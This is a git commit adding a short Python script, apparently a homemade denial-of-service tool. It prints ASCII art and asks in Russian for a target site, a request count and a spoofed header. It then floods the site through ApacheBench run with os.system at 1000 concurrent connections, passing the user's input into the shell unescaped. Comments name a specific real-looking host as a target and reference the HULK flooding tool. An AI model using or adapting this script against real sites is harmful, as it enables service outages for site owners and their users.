61d07e1ab94dfa2e3b496697b77a8632fb6286da
Disems <53857795+Disems@users.noreply.github.com>
2021-04-03 08:49:55 +0300

    Add files via upload

---
+++ DOS/dos.py
@@ -0,0 +1,56 @@
+import os
+import colorama
+import time
+from colorama import init
+# from keyboard import press_and_release
+from time import sleep
+from colorama import Fore, Back, Style
+init()
+# Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
+# Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
+# Style: DIM, NORMAL, BRIGHT, RESET_ALL
+print(Fore. GREEN)
+
+print("Dos by Kadavrul.. Night Demon")
+print(Fore. RED)
+print("…………..$……………………………………..$…………..")
+print("…………$$……………………………………..$$…………")
+print("…………$$……………………………………..$$…………")
+print("…………..$$s………………………………s$$…………..")
+print("…………….$$$$……………………….$$$$…………….")
+print("………………³$$$$..¶¶¶¶¶¶¶¶..$$$$³………………")
+print("………………..³$$$$..¶¶¶¶¶¶..$$$$³………………..")
+print("………………¶..$$$$$..¶¶¶¶..$$$$$..¶………………")
+print("…………….¶¶¶..$$$..¶¶¶¶¶¶..$$$..¶¶………………")
+print("…………….¶¶¶….¶¶¶¶¶¶¶¶¶¶….¶¶¶¶………………")
+print("…………….¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶………………")
+print("………………..¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶………………..")
+print("………………..¶¶……..¶¶¶¶……….¶……………………")
+print("………………..¶¶……..¶¶¶¶……….¶¶………………….")
+print("………………..¶¶¶¶¶¶¶¶..¶¶¶¶¶¶¶¶………………….")
+print("………………….¶¶¶¶¶¶……¶¶¶¶¶¶¶………………….")
+print("……………………….¶¶¶¶¶¶¶¶¶…………………………")
+print("……………………….¶..¶..¶..¶..¶…………………………")
+print("…………¶…………..¶…………..¶…………..¶…………..")
+print("……….¶¶……………………………………….¶¶…………")
+print("……….¶¶……………………………………….¶¶…………")
+print("……….¶¶…………..¶¶……….¶¶…………..¶¶…………")
+print("……….¶¶..¶¶..¶¶..¶…………..¶..¶¶..¶¶..¶¶…………")
+print("……¶..¶¶..¶¶..¶¶..¶…………..¶..¶¶..¶¶..¶¶..¶……..")
+print("….¶¶..¶¶..¶¶..¶¶..¶…………..¶..¶¶..¶¶..¶¶..¶¶……")
+print("……¶¶¶¶..¶¶..¶¶………………….¶¶..¶¶..¶¶¶¶……..")
+print(Fore. GREEN)
+ti_kto = input(" Привет, как твое имя..? \n")
+print(f"Рад вас видеть.. {ti_kto}. Думаю мы быстро подружимся.        ")
+print(" Пример атаки:\n ab -n 100000 -c 1000 -k -r -H 'User-Agent: Google Bot' http://site.com \n ")
+site = input("Site: ")
+n = input("Кол-во пакетов: ")
+h = input("От кого?")
+
+
+
+os.system(f"ab -n {n} -c 1000 -k -r -H '{h}' {site} ")
+
+  #ab -n 100000 -c 1000 -k -r -H "User-Agent: Google Bot" http://www.distant.ttiip.ru/ 
+
+   # os.system("go run hulk/hulk.go -site http://www.distant.ttiip.ru")
